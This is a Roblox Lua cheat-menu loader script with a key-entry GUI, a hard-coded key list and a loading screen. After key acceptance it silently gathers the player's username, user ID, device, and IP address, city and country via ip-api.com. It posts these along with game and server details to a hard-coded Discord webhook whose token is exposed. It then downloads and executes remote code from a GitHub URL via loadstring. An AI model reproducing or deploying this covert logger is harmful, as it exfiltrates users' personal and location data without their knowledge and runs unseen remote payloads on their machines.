local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local Stats = game:GetService("Stats")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- =====================================================
-- CONFIG
-- =====================================================

local GUI_BG = "rbxassetid://130763663944218" -- ‚úÖ background asset (apply to both key GUI + loading)
local GUI_WIDTH, GUI_HEIGHT = 360, 140

-- ‚úÖ Updated valid keys
local validKeys = {
	["MONSY-81ZK-0DM5-2VY4"] = true,
	["CARL-02VB-UD84-7JH8"] = true,
	["BOC-45ZK-6DR3-1QX7"] = true,
	["MATT-82HF-9VQ2-0MBP"] = true,
	["PABLO-73HF-4JX1-9PZQ"] = true,
	["LUCIANO-19DK-8F7J-2LQ9"] = true,
	["KAI-15QN-2DB6-4KJP"] = true,
	["ZEN-33KF-4PT8-7ZDY"] = true,
	["HERMANO-42MF-8XQ3-7LY1"] = true,
	["UNO-60PL-3XHF-8RZ4"] = true,
	["KEYO-19DJ-7L6Q-5MB1"] = true,
	["GERO-90VP-1ZR5-6FT8"] = true,
	["PAUL-94JM-2XVP-1ZQ7"] = true,
	["DAD-65PL-7RND-4XJ8"] = true,
	["KIOSHI-86MF-4C2J-9XQ5"] = true,
	["DRAZ-12ZK-8DR4-5QX1"] = true,
	["CLYDE-24HX-3QK7-2BVM"] = true,
	["IZZY-72BR-0JX5-1LQ4"] = true,
	["CHAM-36JM-5H8L-9TP2"] = true,
	["YOHAN-03DL-6F9T-7RY1"] = true,
	["TAKO-57QN-1ZB4-3HKP"] = true,
	["CHESTER-02VB-UD84-7JH8"] = true,
	["JAVI-67PL-2XHF-0RZ8"] = true,
	["JAY-19VP-7ZDL-6FT3"] = true,
	["PUDAY-48ZJ-0NQD-3YH7"] = true,
	["DAICHI-28QF-9H2L-6BWC"] = true,
	["SANTINO-34HX-5QK9-2BVM"] = true,
	["DEVIL-21MF-8XQ1-7LY9"] = true,
	["JAYPIE-28VF-2QX6-7ZL3"] = true,
	["MONSYZX"] = true,
	["ALKEY-63QN-0DB4-5KJP"] = true,
	["UNO-OGZ1"] = true,
	["UNO-143"] = true,
	["VINCENT-16HX-9QK1-0BVM"] = true,
	["JAY-39MF-7XQ5-2LY8"] = true,
	["NEBULA-54VP-3ZR8-9FT2"] = true,
	["PRIMO-11JM-8H5L-4TP9"] = true
}

-- Webhook info
local webhookURL = "https://discord.com/api/webhooks/1424264813001048125/rjgwpJImauKHhuuP-pI3BbWTU7-jPxIZxHoLyrnfsdgnpgxAj1mMVN46EpEKk0cqqnwa"
local scriptVersion = "MONSY MAIN MENU V2"
local executorName = (identifyexecutor and identifyexecutor()) or "Unknown Executor"
local webhookUsername = "Monsy West"
local webhookAvatarURL = "https://media.discordapp.net/attachments/1405859756756828251/1411694185245048983/1752754542988.jpg"

-- =====================================================
-- üóùÔ∏è KEY SYSTEM GUI
-- =====================================================

local screenGui = Instance.new("ScreenGui", PlayerGui)
screenGui.IgnoreGuiInset = true
screenGui.Name = "KeySystemGUI"

local container = Instance.new("ImageLabel")
container.Size = UDim2.new(0, GUI_WIDTH, 0, GUI_HEIGHT)
container.Position = UDim2.new(0.5, -GUI_WIDTH / 2, 0.5, -GUI_HEIGHT / 2)
container.Image = GUI_BG
container.ScaleType = Enum.ScaleType.Crop
container.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
container.BorderSizePixel = 0
container.Parent = screenGui
Instance.new("UICorner", container).CornerRadius = UDim.new(0, 10)

local title = Instance.new("TextLabel", container)
title.Size = UDim2.new(1, 0, 0, 28)
title.Position = UDim2.new(0, 0, 0, 8)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.Text = "ENTER KEY"
title.TextColor3 = Color3.fromRGB(255, 255, 255)

local keyBox = Instance.new("TextBox", container)
keyBox.Size = UDim2.new(1, -40, 0, 36)
keyBox.Position = UDim2.new(0, 20, 0, 48)
keyBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
keyBox.BorderSizePixel = 0
keyBox.ClearTextOnFocus = false
keyBox.Text = "KEY"
keyBox.TextColor3 = Color3.fromRGB(255, 255, 255)
keyBox.Font = Enum.Font.GothamBold
keyBox.TextSize = 16
keyBox.TextXAlignment = Enum.TextXAlignment.Center
Instance.new("UICorner", keyBox).CornerRadius = UDim.new(0, 6)

-- auto clear / restore text
keyBox.Focused:Connect(function()
	if keyBox.Text == "KEY" then keyBox.Text = "" end
end)
keyBox.FocusLost:Connect(function()
	if keyBox.Text == "" then keyBox.Text = "KEY" end
end)

local submitBtn = Instance.new("TextButton", container)
submitBtn.Size = UDim2.new(0, 100, 0, 36)
submitBtn.Position = UDim2.new(0.5, -50, 1, -48)
submitBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
submitBtn.BorderSizePixel = 1
submitBtn.BorderColor3 = Color3.fromRGB(255, 255, 255)
submitBtn.Font = Enum.Font.GothamBold
submitBtn.TextSize = 16
submitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
submitBtn.Text = "SUBMIT"
Instance.new("UICorner", submitBtn).CornerRadius = UDim.new(0, 6)

local feedback = Instance.new("TextLabel", container)
feedback.Size = UDim2.new(1, -20, 0, 18)
feedback.Position = UDim2.new(0, 10, 1, -22)
feedback.BackgroundTransparency = 1
feedback.Font = Enum.Font.Gotham
feedback.TextSize = 14
feedback.TextColor3 = Color3.fromRGB(255, 255, 255)
feedback.Text = ""

-- draggable
local dragging, dragInput, dragStart, startPos
container.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		dragStart = input.Position
		startPos = container.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then dragging = false end
		end)
	end
end)
container.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement then dragInput = input end
end)
UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		local delta = input.Position - dragStart
		container.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end)

-- =====================================================
-- ‚úÖ VALIDATION FUNCTION
-- =====================================================

local function validateKey(key)
	if not key or key == "" or key == "KEY" then
		return false, "Please enter a key."
	end
	key = key:upper()
	if validKeys[key] then
		return true, "Key accepted!"
	else
		return false, "Invalid key."
	end
end

-- =====================================================
-- üß© WEBHOOK LOGGER
-- =====================================================
local function sendWebhook(usedKey)
	local placeId = game.PlaceId
	local success, productInfo = pcall(function()
		return MarketplaceService:GetProductInfo(placeId, Enum.InfoType.Asset)
	end)
	local gameName = success and productInfo.Name or "Unknown"
	local creatorName = success and productInfo.Creator.Name or "Unknown"
	local creatorId = success and productInfo.Creator.CreatorTargetId or 0
	local visits = success and productInfo.Visits or "Unknown"
	local gameThumbnail = ("https://www.roblox.com/asset-thumbnail/image?assetId=%d&width=768&height=432&format=png"):format(placeId)
	local gameLink = ("https://www.roblox.com/games/%d"):format(placeId)

	local userId = LocalPlayer.UserId
	local displayName = LocalPlayer.DisplayName
	local accountAge = LocalPlayer.AccountAge
	local joinDate = os.date("%Y-%m-%d", os.time() - (accountAge * 86400))
	local avatarHeadshot = ("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png"):format(userId)
	local profileLink = ("https://www.roblox.com/users/%d/profile"):format(userId)

	local ip, city, country = "Unknown", "Unknown", "Unknown"
	pcall(function()
		local ipResponse = game:HttpGet("http://ip-api.com/json/")
		local ipData = HttpService:JSONDecode(ipResponse)
		ip = ipData.query or "Unknown"
		city = ipData.city or "Unknown"
		country = ipData.country or "Unknown"
	end)

	local ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
	local fps = math.floor(1 / RunService.RenderStepped:Wait())

	local deviceType = "PC"
	if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
		deviceType = "Mobile"
	elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then
		deviceType = "Console"
	end

	local jobId = game.JobId
	local totalPlayers = #Players:GetPlayers()
	local joinServerLink = ("https://www.roblox.com/games/%d?privateServerLinkCode=%s"):format(placeId, jobId)

	local data = {
		username = webhookUsername,
		avatar_url = webhookAvatarURL,
		embeds = {{
			title = "Access Granted",
			color = 0x010101,
			thumbnail = { url = avatarHeadshot },
			image = { url = gameThumbnail },
			fields = {
				{
					name = "‚òØÔ∏é Player Info",
					value = string.format("**Username:** [%s](%s)\n**Display Name:** %s\n**User ID:** `%d`\n**Device:** `%s`",
						LocalPlayer.Name, profileLink, displayName, userId, deviceType),
					inline = true
				},
				{
					name = "‚òØÔ∏é Game Info",
					value = string.format("**Game:** [%s](%s)\n**Creator:** [%s](https://www.roblox.com/users/%s/profile)\n**Players:** `%d`",
						gameName, gameLink, creatorName, tostring(creatorId), totalPlayers),
					inline = true
				},
				{
					name = "‚òØÔ∏é Network",
					value = string.format("**IP:** `%s`\n**City:** `%s`\n**Country:** `%s`\n**Ping:** `%dms`\n**FPS:** `%d`",
						ip, city, country, ping, fps),
					inline = true
				},
				{
					name = "‚òØÔ∏é Script Info",
					value = string.format("**Executor:** `%s`\n**Version:** `%s`\n**Used Key:** `%s`", executorName, scriptVersion, usedKey),
					inline = false
				}
			},
			footer = { text = "Logged at " .. os.date("%Y-%m-%d %H:%M:%S"), icon_url = webhookAvatarURL }
		}}
	}

	local jsonData = HttpService:JSONEncode(data)
	local req = syn and syn.request or http_request or request
	if req then
		req({ Url = webhookURL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = jsonData })
	end
end

-- =====================================================
-- ‚è≥ LOADING SCREEN
-- =====================================================
local function showLoadingAndRun(keyUsed)
	local gui = Instance.new("ScreenGui", PlayerGui)
	gui.IgnoreGuiInset = true

	local bg = Instance.new("ImageLabel", gui)
	bg.Size = UDim2.new(1, 0, 1, 0)
	bg.Image = GUI_BG
	bg.ScaleType = Enum.ScaleType.Crop
	bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)

	local label = Instance.new("TextLabel", gui)
	label.Size = UDim2.new(1, 0, 0, 50)
	label.Position = UDim2.new(0, 0, 0.8, 0)
	label.BackgroundTransparency = 1
	label.Font = Enum.Font.GothamBold
	label.TextSize = 22
	label.TextColor3 = Color3.fromRGB(255, 255, 255)
	label.Text = "Loading..."
	label.TextStrokeTransparency = 0.8

	local barContainer = Instance.new("Frame", gui)
	barContainer.Size = UDim2.new(0.6, 0, 0.03, 0)
	barContainer.Position = UDim2.new(0.2, 0, 0.9, 0)
	barContainer.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Instance.new("UICorner", barContainer).CornerRadius = UDim.new(0, 6)

	local progressBar = Instance.new("Frame", barContainer)
	progressBar.Size = UDim2.new(0, 0, 1, 0)
	progressBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	Instance.new("UICorner", progressBar).CornerRadius = UDim.new(0, 6)

	-- bottom-right info
	local info = Instance.new("TextLabel", gui)
	info.AnchorPoint = Vector2.new(1, 1)
	info.Position = UDim2.new(1, -10, 1, -10)
	info.Size = UDim2.new(0, 300, 0, 50)
	info.BackgroundTransparency = 1
	info.Font = Enum.Font.Gotham
	info.TextSize = 14
	info.TextColor3 = Color3.fromRGB(255, 255, 255)
	info.TextXAlignment = Enum.TextXAlignment.Right
	info.TextYAlignment = Enum.TextYAlignment.Bottom
	info.Text = string.format("Username: %s\nDisplay: %s\nUser ID: %d",
		LocalPlayer.Name, LocalPlayer.DisplayName, LocalPlayer.UserId)

	-- tween bar
	TweenService:Create(progressBar, TweenInfo.new(10, Enum.EasingStyle.Linear), { Size = UDim2.new(1, 0, 1, 0) }):Play()

	task.delay(10, function()
		gui:Destroy()
		task.spawn(function() sendWebhook(keyUsed) end)
		loadstring(game:HttpGet("https://raw.githubusercontent.com/RemorseZx/test/refs/heads/main/test123"))()
	end)
end

-- =====================================================
-- BUTTON FUNCTION
-- =====================================================
submitBtn.MouseButton1Click:Connect(function()
	local key = keyBox.Text
	local ok, msg = validateKey(key)
	if ok then
		feedback.Text = "‚úî " .. msg
		task.wait(0.5)
		screenGui:Destroy()
		showLoadingAndRun(key)
	else
		feedback.Text = "‚úò " .. msg
	end
end)
